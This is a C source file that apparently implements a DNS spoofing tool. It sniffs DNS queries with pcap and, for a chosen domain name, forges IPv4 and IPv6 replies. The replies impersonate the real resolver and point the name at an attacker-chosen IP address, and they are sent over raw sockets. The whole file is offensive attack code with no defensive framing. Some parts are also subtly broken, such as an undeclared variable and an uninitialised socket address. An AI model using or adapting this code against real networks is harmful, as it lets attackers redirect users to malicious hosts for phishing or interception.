#include "spoof.h"


void pkt_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct etherhdr* ether;

    /* ethernet */
    ether = (struct etherhdr*)(packet);
    if (ntohs(ether->ether_type) == ETHERTYPE_IP) {
        process_ipv4(pkthdr, packet);
    }
    if (ntohs(ether->ether_type) == ETHERTYPE_IPV6) {
        opts.ipv6_flag = TRUE;
        process_ipv6(pkthdr, packet);
        opts.ipv6_flag = FALSE;
    }
}


void process_ipv4(const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct etherhdr* ether;
    struct iphdr *ip;
    struct udphdr* udp;
    struct dnshdr* dns_hdr;
    struct dnsquery* dns_query;
    struct in_addr ip_addr;

//    char* answer = NULL;
    char request[URL_SIZE] = {0}, response[DEFAULT_SIZE] = {0};
    unsigned short size_payload;
    unsigned short size_res_payload;
    unsigned short size_dns_payload;

    ether = (struct etherhdr*)(packet);
    /* ip header */
    ip = (struct iphdr*)(((char*) ether) + sizeof(struct etherhdr));
    /* udp header */
    udp = (struct udphdr*)(((char*) ip) + sizeof(struct iphdr));
    /* dns header */
    dns_hdr = (struct dnshdr*)(((char*) udp) + sizeof(struct udphdr));
    /* dns query */
    dns_query = (struct dnsquery*)((char*) dns_hdr + 12);

    size_payload = ntohs(ip->tot_len) - sizeof(struct iphdr) + sizeof(struct udphdr);
    if (size_payload > 0) {
        handle_DNS_query(dns_query, request);
        if (!strcmp(request, opts.request_url)) {
            puts("[ IPv4 ]");
            /* set up opts (get necessary info) */
            opts.device_port = ntohs(udp->uh_sport);
            opts.tid = ntohs(dns_hdr->id);
            ip_addr.s_addr = ip->daddr;
            strcpy(opts.dns_ip, inet_ntoa(ip_addr));

            answer = response + sizeof(struct iphdr) + sizeof(struct udphdr);
            size_dns_payload = set_payload(dns_hdr, answer, request, opts.ipv6_flag);
            size_res_payload = (sizeof(struct ip) + sizeof(struct udphdr)) + size_dns_payload;
            answer = response;
            create_ipv4_header(answer, size_dns_payload, size_res_payload);
            send_dns_answer(answer, size_res_payload);
        }
    }
}


void process_ipv6(const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct etherhdr* ether;
    struct ip6_hdr *ip;
    struct udphdr* udp;
    struct dnshdr* dns_hdr;
    struct dnsquery* dns_query;

//    char* answer = NULL;
    char request[URL_SIZE] = {0};
    char response[DEFAULT_SIZE] = {0}, datagram[DEFAULT_SIZE] = {0};
    unsigned short size_payload;
    unsigned short size_res_payload;
    unsigned short size_dns_payload;

    ether = (struct etherhdr*)(packet);
    /* ip header */
    ip = (struct ip6_hdr*)(((char*) ether) + sizeof(struct etherhdr));
    /* udp header */
    udp = (struct udphdr*)(((char*) ip) + sizeof(struct ip6_hdr));
    /* dns header */
    dns_hdr = (struct dnshdr*)(((char*) udp) + sizeof(struct udphdr));
    /* dns query */
    dns_query = (struct dnsquery*)((char*) dns_hdr + 12);

    size_payload = ntohs(ip->ip6_ctlun.ip6_un1.ip6_un1_plen) - sizeof(struct udphdr);
    if (size_payload > 0) {
        handle_DNS_query(dns_query, request);
        if (!strcmp(request, opts.request_url)) {
            puts("[ IPv6 ]");
            /* set up opts (get necessary info) */
            inet_ntop(AF_INET6, &ip->ip6_src, opts.device_ipv6, INET6_ADDRSTRLEN);
            inet_ntop(AF_INET6, &ip->ip6_dst, opts.dns_ipv6, INET6_ADDRSTRLEN);
            opts.device_port = ntohs(udp->uh_sport);
            opts.tid = ntohs(dns_hdr->id);

            answer = response + sizeof(struct ip6_hdr) + sizeof(struct udphdr);
            size_dns_payload = set_payload(dns_hdr, answer, request, opts.ipv6_flag);
            size_res_payload = (sizeof(struct ip6_hdr) + sizeof(struct udphdr)) + size_dns_payload;
            create_ipv6_header(response, size_dns_payload, size_res_payload);
            for (int i = 0; i < 10; i++)
                send_dns_answer2(response, size_res_payload);
        }
    }
}




/**
 * Extracts the request from a dns query
 * It comes in this format: [3]www[5]abcdefg[3]com[0]
 * And it is returned in this: www.abcdefg.com
 */
void handle_DNS_query(struct dnsquery* dns_query, char *request) {
    unsigned int i, j, k;
    uint8_t* curr = (uint8_t*)dns_query;
    char type[3] = {0};
    unsigned int size;

    size = (unsigned int) curr[0];

    j=0;
    i=1;
    while(size > 0) {
        for(k=0; k<size; k++) {
            request[j++] = curr[i + k];
        }
        request[j++]='.';
        i+=size;
        size = curr[i++];
    }
    request[--j] = '\0';
    opts.query_name = curr;
    curr += strlen(request) + 2;
    memcpy(opts.type, curr, 2);
//    memcpy(type, curr, 2);
//    if (!strcmp(type, "\x00\x01")) {
//        memcpy(opts.type, curr, 2);
//    }
}


uint16_t set_payload(struct dnshdr *dns_hdr, char* answer, char* request, bool flag) {
    struct dnshdr* dns = NULL;
    char* token;
    int i = 0;


    dns = (struct dnshdr*) answer;
    dns->id = htons(opts.tid);
    dns->qr = 1; // This is a response
    dns->opcode = 0; // Standard response
    dns->aa = 0; // Not Authoritative (This might change based on your DNS server)
    dns->tc = 0; // Message not truncated
    dns->rd = 1; // Recursion Desired
    dns->ra = 1; // Recursion available -
    dns->z = 0; // Reserved field
    dns->ad = 0; // Authenticated data (relevant in DNSSEC)
    dns->cd = 0; // Checking disabled (relevant in DNSSEC)
    dns->rcode = 0; // Response code - should be 0 (NOERROR) for a successful response
    dns->q_count = htons(1); // only 1 question
    dns->ans_count = htons(1); // Number of answer RRs - Change this to reflect the number of answers
    dns->auth_count = 0; // Number of authority RRs - Change this if you're including any authority RRs
    dns->add_count = 0; // Number of additional RRs - Change this if you're including any additional RRs


    for (int i = 0; i < strlen((char*)opts.query_name); i++) {
        answer[12 + i] = (char) opts.query_name[i];
    }
    answer[12 + strlen((char*)opts.query_name)] = 0;
    answer += 12 + strlen((char*)opts.query_name) + 1;

    memcpy(answer, opts.type, 2);  // type
    answer += 2;

    memcpy(answer, "\x00\x01", 2);  // class
    answer += 2;

    memcpy(answer, "\xc0\x0c", 2);  // pointer to name
    answer += 2;

    memcpy(answer, opts.type, 2);  // type
    answer += 2;

    memcpy(answer, "\x00\x01", 2);  // class
    answer += 2;

    memcpy(answer, "\x00\x00\x00\x99", 4);  // ttl
    answer += 4;

    memcpy(answer, "\x00\x04", 2);   // data len
    answer += 2;

    token = strtok(opts.spoofing_ip, ".");
    while(token != NULL) {
        answer[i] = (uint8_t) atoi(token);
        token = strtok(NULL, ".");
        i++;
    }


    return (uint16_t) (12 + strlen((char *) opts.query_name) + 1 + 20);
}


void create_ipv4_header(char* response_packet, uint16_t size_dns_payload, uint16_t size_response_payload) {
    struct ip *ip_header = (struct ip *) response_packet;
    struct udphdr *udp_header = (struct udphdr *) (response_packet + sizeof (struct ip));

    /* IP header */
    ip_header->ip_hl = 5;
    ip_header->ip_v = 4;
    ip_header->ip_tos = 0;
    ip_header->ip_id = 0;
    ip_header->ip_len = htons(size_response_payload);
    ip_header->ip_off = 0;
    ip_header->ip_ttl = 64;
    ip_header->ip_p = IPPROTO_UDP;
    ip_header->ip_src.s_addr = host_convert(opts.dns_ip);
    ip_header->ip_dst.s_addr = host_convert(opts.device_ip);
    ip_header->ip_sum = calc_ip_checksum(ip_header);

    /* UDP header */
    udp_header->source = htons(53);
    udp_header->dest = htons(opts.device_port);
    udp_header->len = htons(sizeof(struct udphdr) + size_dns_payload);
    udp_header->uh_sum = 0;
}


void create_ipv6_header(char* response_packet, uint16_t size_dns_payload, uint16_t size_response_payload) {
    struct ip6_hdr *ipv6_header = (struct ip6_hdr *) response_packet;
    struct udphdr *udp_header = (struct udphdr *) (response_packet + sizeof (struct ip6_hdr));
    struct in6_addr srcAddr, dstAddr;

    inet_pton(AF_INET6, opts.dns_ipv6, &srcAddr);
    inet_pton(AF_INET6, opts.device_ipv6, &dstAddr);
    /* IP header */
    ipv6_header->ip6_ctlun.ip6_un1.ip6_un1_flow = htonl(0x60400000);
    ipv6_header->ip6_ctlun.ip6_un1.ip6_un1_plen = htons(size_response_payload);
    ipv6_header->ip6_ctlun.ip6_un1.ip6_un1_nxt = IPPROTO_UDP;
    ipv6_header->ip6_ctlun.ip6_un1.ip6_un1_hlim = 64;
    ipv6_header->ip6_src = srcAddr;
    ipv6_header->ip6_dst = dstAddr;

    /* UDP header */
    udp_header->source = htons(53);
    udp_header->dest = htons(opts.device_port);
    udp_header->len = htons(sizeof(struct udphdr) + size_dns_payload);
    udp_header->uh_sum = 0;
}


void send_dns_answer(char* response_packet, uint16_t size_response_payload) {
    struct sockaddr_in sin;
    int bytes_sent;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int one = 1;

    if (sock < 0) {
        fprintf(stderr, "Error creating socket");
        return;
    }
    sin.sin_family = AF_INET;
    sin.sin_port = 53;
    sin.sin_addr.s_addr = inet_addr(opts.dns_ip);


    bytes_sent = sendto(sock, response_packet, size_response_payload, 0, (struct sockaddr *)&sin, sizeof(sin));
    if(bytes_sent < 0)
        fprintf(stderr, "Error sending data");
}


void send_dns_answer2(char* response_packet, uint16_t size_response_payload) {
    struct sockaddr_in6 sin;
    ssize_t bytes_sent = 0;
    int sock = socket(AF_INET6, SOCK_DGRAM,IPPROTO_UDP);

    if (sock < 0) {
        fprintf(stderr, "Error creating socket");
        return;
    }

    bytes_sent = sendto(sock, response_packet, size_response_payload, 0, (struct sockaddr *)&sin, sizeof(sin));
    if(bytes_sent < 0)
        fprintf(stderr, "Error sending data");
}
